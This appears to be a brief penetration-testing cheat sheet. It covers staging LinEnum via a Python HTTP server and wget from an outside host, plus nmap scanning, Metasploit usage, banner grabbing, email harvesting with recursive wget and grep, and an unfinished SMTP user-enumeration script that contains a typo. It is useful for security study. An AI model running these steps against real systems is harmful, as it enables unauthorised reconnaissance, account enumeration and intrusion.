# Security

- [Lin Enum](https://github.com/rebootuser/LinEnum)

### Quick Python HTTP server
Will serve any file in directory
```shell
python -m SimpleHTTPServer 8000
```
To fetch from the remote machine
```shell
wget http://<ip>:8000/LinEnum.sh
```

### nmap
```shell
nmap -sC -A -T4 <ip>
```

### Metasploit basic usage
```shell
msfconsole
search <name>
use <id>
show options
set rhosts <ip>
set targeturi /cgi-bin/hello.cgi
run
```

### Basic banner grabbing (Python)
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.198.73.23", 23))

print s.recv(1024)
```

### Recursive wget 
```shell
wget -r --level=1 -p http://<website> 
find . -name "*" -exec cat {} \; | grep "@email.com" # find strings in downloaded sites
```

### Basic SMTP enum (Python)

```python
import socket
f = open("userlist", "r")
users = f.readlines()

for user in users:
    s = socket.socket(socket.AFINTE)

    s.connect(("mail.baldrinc.com", 25))
    s.recv(1024)
    s.send("HELO")
    #...
```